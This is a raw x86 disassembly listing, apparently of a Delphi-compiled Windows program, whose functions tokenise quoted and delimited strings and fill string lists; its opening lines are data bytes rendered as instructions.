add [ ebp + 0x41 ] ah
add al bh
mov dl 0x41
add [ ebx + esi * 4 + 0x41 ] dl
add [ eax ] ch
mov ah 0x41
add [ eax + 0x640041ac ] dh
mov ah 0x41
add al bl
mov ah 0x41
add ah bh
scasb [ edi ]
inc ecx
add [ eax ] cl
scasd [ edi ]
inc ecx
add [ eax - 0x62 ] cl
inc ecx
add [ edi + ebp * 4 - 0x501bffbf ] ah
inc ecx
add [ eax - 0x50 ] dl
inc ecx
add [ eax ] dl
movsd [ edi ] [ esi ]
inc ecx
add al ah
mov cl 0x41
add [ edi - 0x5787ffbf ] ah
inc ecx
add [ edx + esi * 4 ] bl
inc ecx
add [ edx + esi * 4 ] ch
inc ecx
add ah bl
test al 0x41
add [ eax ] dh
test eax 0xa9dc0041
inc ecx
add [ ebx + ebp * 4 + 0x41 ] dh
add ah cl
stosd [ edi ]
inc ecx
add [ eax - 0x54 ] ah
inc ecx
add [ edi + ebp * 4 + 0x41 ] ch
add [ eax - 0x7fffbe51 ] cl
mov dl 0x41
add al dl
mov al 0x41
add [ eax - 0x5fffbe4c ] dl
mov ah 0x41
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x300040 ] dl
add [ eax ] al
or eax 0x48644954
popad
jb r-xdata
add [ eax + 0x477c ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x7c ] ch
inc edi
add [ eax + eax ] bh
add [ eax ] al
shr [ ecx + 0x41 ] 0x1
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ eax - 0x27ffbe52 ] ah
xchg ebx eax
inc ecx
add [ eax ] cl
mov al [ 0xffffffff9f000041 ]
add bl dh
movsd [ edi ] [ esi ]
imul esi [ ebx + 0x74 ] r-xdata
pop es
or eax 0x48644954
popad
jb r-xdata
lea eax [ ebp - 0x6c ]
push eax
mov ecx 0x7fffffff
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_404638
mov edx [ ebp - 0x6c ]
mov eax [ ebp + 0x8 ]
call sub_4043e0
mov eax [ ebp + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477eb5
lea eax [ ebp - 0x6c ]
call sub_404118
lea eax [ ebp - 0x48 ]
mov edx 0x2
call sub_40413c
retn
mov eax [ ebp - 0x4 ]
mov bl [ eax + esi - 0x1 ]
mov eax [ rw-data ]
mov edx ebx
and edx 0xff
bt [ eax ] edx
jae r-xdata
mov [ ebp - 0xc ] 0x1
mov esi 0x1
mov [ ebp - 0x10 ] 0x1
xor [ ecx + ecx * 4 + 0x20 ] ah
imul esi [ ebx + 0x74 ] r-xdata
shr [ edx + 0x41 ] 0x0
add [ eax ] al
or al 0x49
dec eax
popad
jb r-xdata
mov eax [ ebp - 0x8 ]
cmp bl [ eax ]
jne r-xdata
inc esi
inc [ ebp - 0xc ]
jmp r-xdata
xor edi edi
mov [ ebp - 0x19 ] 0x20
mov [ ebp - 0x1a ] 0x0
mov eax [ ebp - 0x4 ]
call sub_4043d8
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
call sub_4043d8
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x8 ]
call sub_404118
cmp esi [ ebp - 0x14 ]
jg r-xdata
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_477eae
push [ fs : eax ]
mov [ fs : eax ] esp
imul esi [ ebx + 0x74 ] 0x8b550000
in al dx
add esp 0xffffff94
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x6c ] ebx
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x44 ] ebx
mov esi ecx
lea edi [ ebp - 0x40 ]
mov ecx 0x8
[ edi ] [ esi ]
mov eax ebx
and eax 0xff
bt [ ebp - 0x40 ] eax
jae r-xdata
cmp [ ebp - 0x19 ] 0x20
jne r-xdata
inc esi
inc [ ebp - 0xc ]
mov al [ ebp - 0x19 ]
sub al 0x22
je r-xdata
mov eax ebx
sub al 0x22
jne r-xdata
cmp [ ebp - 0x19 ] 0x20
jne r-xdata
lea eax [ ebp - 0x44 ]
push eax
mov ecx [ ebp - 0x18 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_404638
mov edx [ ebp - 0x44 ]
mov eax [ ebp - 0x8 ]
call sub_408248
mov [ ebp - 0x1a ] al
cmp [ ebp - 0x1a ] 0x0
je r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
cmp [ ebp - 0x1a ] 0x0
jne r-xdata
cmp bl [ ebp - 0x19 ]
jne r-xdata
mov edi esi
jmp r-xdata
mov eax [ ebp - 0x18 ]
dec eax
add esi eax
mov edi esi
jmp r-xdata
mov eax esi
sub eax edi
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x48 ]
push eax
mov ecx edi
sub ecx [ ebp - 0x10 ]
inc ecx
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_404638
mov edx [ ebp - 0x48 ]
mov eax [ ebp + 0x8 ]
call sub_4043e0
mov eax [ ebp + 0x8 ]
sub bl 0x22
je r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0xc ]
jle r-xdata
cmp [ ebp - 0x19 ] 0x20
jne r-xdata
mov [ ebp - 0x19 ] 0x20
jmp r-xdata
cmp [ ebp - 0x1a ] 0x0
jne r-xdata
jmp r-xdata
cmp edi [ ebp - 0x10 ]
jle r-xdata
mov [ ebp - 0x19 ] bl
inc edi
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x1a ] 0x0
cmp esi [ ebp - 0x14 ]
jge r-xdata
cmp esi [ ebp - 0x14 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_4043e0
mov eax [ ebp + 0x8 ]
push esi
push edi
lea esi [ ebp - 0x40 ]
lea edi [ ebp - 0x68 ]
mov ecx 0x8
[ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x68 ]
mov edx r-xdata
mov cl 0x20
call sub_402e5c
mov eax [ ebp - 0x4 ]
mov al [ eax + esi - 0x1 ]
and eax 0xff
bt [ ebp - 0x68 ] eax
jb r-xdata
inc esi
sub_477ca8
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x6c ] ebx
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x44 ] ebx
mov esi ecx
lea edi [ ebp - 0x40 ]
mov ecx 0x8
[ edi ] [ esi ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_477eae
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xc ] 0x1
mov esi 0x1
mov [ ebp - 0x10 ] 0x1
xor edi edi
mov [ ebp - 0x19 ] 0x20
mov [ ebp - 0x1a ] 0x0
mov eax [ ebp - 0x4 ]
call sub_4043d8
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
call sub_4043d8
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x8 ]
call sub_404118
cmp esi [ ebp - 0x14 ]
jg r-xdata
lea eax [ ebp - 0x6c ]
push eax
mov ecx 0x7fffffff
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_404638
mov edx [ ebp - 0x6c ]
mov eax [ ebp + 0x8 ]
call sub_4043e0
mov eax [ ebp + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477eb5
lea eax [ ebp - 0x6c ]
call sub_404118
lea eax [ ebp - 0x48 ]
mov edx 0x2
call sub_40413c
retn
mov eax [ ebp - 0x4 ]
mov bl [ eax + esi - 0x1 ]
mov eax [ rw-data ]
mov edx ebx
and edx 0xff
bt [ eax ] edx
jae r-xdata
mov eax [ ebp - 0x8 ]
cmp bl [ eax ]
jne r-xdata
inc esi
inc [ ebp - 0xc ]
jmp r-xdata
mov eax ebx
and eax 0xff
bt [ ebp - 0x40 ] eax
jae r-xdata
cmp [ ebp - 0x19 ] 0x20
jne r-xdata
inc esi
inc [ ebp - 0xc ]
mov al [ ebp - 0x19 ]
sub al 0x22
je r-xdata
mov eax ebx
sub al 0x22
jne r-xdata
cmp [ ebp - 0x19 ] 0x20
jne r-xdata
lea eax [ ebp - 0x44 ]
push eax
mov ecx [ ebp - 0x18 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_404638
mov edx [ ebp - 0x44 ]
mov eax [ ebp - 0x8 ]
call sub_408248
mov [ ebp - 0x1a ] al
cmp [ ebp - 0x1a ] 0x0
je r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
cmp [ ebp - 0x1a ] 0x0
jne r-xdata
cmp bl [ ebp - 0x19 ]
jne r-xdata
mov edi esi
jmp r-xdata
mov eax [ ebp - 0x18 ]
dec eax
add esi eax
mov edi esi
jmp r-xdata
mov eax esi
sub eax edi
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x48 ]
push eax
mov ecx edi
sub ecx [ ebp - 0x10 ]
inc ecx
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_404638
mov edx [ ebp - 0x48 ]
mov eax [ ebp + 0x8 ]
call sub_4043e0
mov eax [ ebp + 0x8 ]
sub bl 0x22
je r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0xc ]
jle r-xdata
cmp [ ebp - 0x19 ] 0x20
jne r-xdata
mov [ ebp - 0x19 ] 0x20
jmp r-xdata
cmp [ ebp - 0x1a ] 0x0
jne r-xdata
jmp r-xdata
cmp edi [ ebp - 0x10 ]
jle r-xdata
mov [ ebp - 0x19 ] bl
inc edi
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x1a ] 0x0
cmp esi [ ebp - 0x14 ]
jge r-xdata
cmp esi [ ebp - 0x14 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_4043e0
mov eax [ ebp + 0x8 ]
push esi
push edi
lea esi [ ebp - 0x40 ]
lea edi [ ebp - 0x68 ]
mov ecx 0x8
[ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x68 ]
mov edx r-xdata
mov cl 0x20
call sub_402e5c
mov eax [ ebp - 0x4 ]
mov al [ eax + esi - 0x1 ]
and eax 0xff
bt [ ebp - 0x68 ] eax
jb r-xdata
inc esi
sub_477ee0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4032ec
lea eax [ esi + 0x30 ]
mov edx r-xdata
call sub_40416c
mov [ esi + 0x34 ] 0x0
mov [ esi + 0x35 ] 0x1
mov [ esi + 0x36 ] 0x1
mov [ esi + 0x38 ] 0x4e
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_477f44
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_477fd4
push [ fs : eax ]
mov [ fs : eax ] esp
inc esi
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
cmp esi eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477fdb
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_40413c
retn
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4043d8
test eax eax
jle r-xdata
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x9
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x20
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_477fe4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_4045c8
xor eax eax
push ebp
push sub_4780b9
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4780c8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_47808f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0xc ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0x20 ]
dec ebx
cmp ebx 0xffffffff
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478096
lea eax [ ebp - 0xc ]
call sub_40d814
retn
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0xc ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0x60 ]
dec ebx
cmp ebx 0xffffffff
jg r-xdata
sub_4780c8
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4045c8
xor eax eax
push ebp
push sub_478190
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_478166
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x38 ]
push eax
lea eax [ ebp - 0xc ]
push eax
mov ecx r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_477ca8
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
push 0x1
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0xc ]
mov cl 0x1
mov edx r-xdata
call sub_47423c
mov eax [ ebp - 0x14 ]
lea edx [ ebp - 0x10 ]
call sub_408304
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47816d
retn
sub_4781d8
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_478266
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
cmp [ esi + 0x34 ] 0x0
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax [ esi + 0x30 ]
call sub_408304
mov eax [ ebp - 0xc ]
mov esi [ rw-data ]
mov esi [ esi ]
mov edx [ ebx ]
call esi
mov esi eax
push ebx
mov ecx esi
dec ecx
mov eax [ ebx ]
mov edx 0x1
call sub_404638
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47826d
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_40413c
retn
lea edx [ ebp - 0x8 ]
mov eax [ ebx ]
call sub_408064
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_40416c
sub_478274
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4783c4
mov edx eax
mov ecx edi
mov eax ebx
call sub_478298
pop edi
pop esi
pop ebx
retn
sub_478298
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4783a8
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_404118
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jge r-xdata
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_4781d8
mov eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_4043d8
mov edx eax
add edx 0x2
mov ecx 0x7fffffff
pop eax
call sub_404638
cmp [ esi + 0x35 ] 0x0
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_408280
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_40416c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4783af
lea eax [ ebp - 0x1c ]
mov edx 0x6
call sub_40413c
retn
inc ebx
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x8 ]
mov al [ eax ]
sub al 0x9
je r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_408280
push [ ebp - 0x14 ]
push r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_408280
push [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov edx 0x3
call sub_404498
jmp r-xdata
sub al 0x17
jne r-xdata
sub_4783c4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_478437
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0xffffffff
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47843e
lea eax [ ebp - 0xc ]
call sub_404118
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov [ ebp - 0x8 ] ebx
jmp r-xdata
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax edi
call sub_4781d8
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_408248
test al al
je r-xdata
sub_478448
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_478513
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx edi
mov eax ebx
call sub_4783c4
mov esi eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test esi esi
jl r-xdata
test esi esi
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47851a
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_40413c
retn
cmp [ ebx + 0x36 ] 0x0
je r-xdata
cmp [ ebx + 0x36 ] 0x0
je r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov esi eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx esi
mov eax ebx
call sub_477f44
push edi
push [ ebx + 0x30 ]
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_404498
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x20 ]
jmp r-xdata
mov edx esi
mov eax ebx
call sub_477f44
push edi
push [ ebx + 0x30 ]
push [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_404498
mov edx [ ebp - 0x8 ]
mov ecx esi
mov eax ebx
call sub_477fe4
jmp r-xdata
sub_478524
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_478549
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478550
retn
sub_478794
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x30 ] esi
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
sub_4787f4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
cmp [ ebx + 0x52 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
push 0x0
push 0x0
mov eax esi
call sub_41b514
sub_478824
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5a ] 0x0
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop esi
pop ebx
retn
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
push 0x0
push 0x0
mov eax esi
call sub_41b514
sub_478854
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_421d98
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x34 ]
jne r-xdata
xor eax eax
mov [ esi + 0x34 ] eax
sub_4788c8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4788ed
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4788f4
retn
sub_4789f0
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4752b8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_478a24
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_478a49
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478a50
retn
sub_478be0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41964c
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ esi + 0x10 ] eax
mov eax esi
call sub_478bc4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_478c2c
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
lea eax [ esi + 0x10 ]
call sub_40d814
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419684
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_478c5c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_478d57
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_478bc4
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478d5e
lea eax [ ebp - 0x1c ]
mov edx 0x5
call sub_40413c
retn
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x14 ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x14 ]
mov ecx 0x4
mov edx 0x1
call sub_404638
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_408280
mov eax [ ebp - 0xc ]
call sub_4043d8
cmp eax 0x4
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax esi
call sub_478fc8
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x3 ] 0x2d
jne r-xdata
inc ebx
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_404764
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x1c ]
mov ecx 0x7fffffff
mov edx 0x5
call sub_404638
mov edx [ ebp - 0x18 ]
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
inc [ ebp - 0x8 ]
dec ebx
jne r-xdata
sub_478d68
push ebp
mov ebp esp
push ecx
mov ecx 0x7
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_478f26
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_478bc4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478f2d
lea eax [ ebp - 0x3c ]
mov edx 0xb
call sub_40413c
lea eax [ ebp - 0xc ]
call sub_404118
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx eax
dec edx
lea ecx [ ebp - 0x18 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x18 ]
lea edx [ ebp - 0x14 ]
call sub_408280
mov eax [ ebp - 0x14 ]
mov edx r-xdata
call sub_408248
test al al
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx eax
dec edx
lea ecx [ ebp - 0x20 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4043d8
mov edx eax
add edx 0x2
mov ecx 0x3
pop eax
call sub_404638
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0xc ]
call sub_408280
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_478fc8
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_478fc8
jmp r-xdata
inc eax
mov [ ebp - 0x10 ] eax
xor esi esi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x3c ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x3c ]
mov ecx 0x7fffffff
mov edx 0x3
call sub_404638
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x34 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4043d8
mov edx eax
add edx 0x5
mov ecx 0x7fffffff
pop eax
call sub_404638
mov eax [ ebp - 0x30 ]
lea edx [ ebp - 0x2c ]
call sub_408280
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
jmp r-xdata
lea eax [ ebp - 0x24 ]
push eax
lea ecx [ ebp - 0x28 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4043d8
mov ecx eax
mov edx 0x1
pop eax
call sub_404638
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x8 ]
call sub_408248
test al al
je r-xdata
inc esi
dec [ ebp - 0x10 ]
jne r-xdata
sub_478f60
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_478fab
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebx + 0xc ] esi
test esi esi
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478fb2
lea eax [ ebp - 0x4 ]
call sub_404118
retn
lea edx [ ebp - 0x4 ]
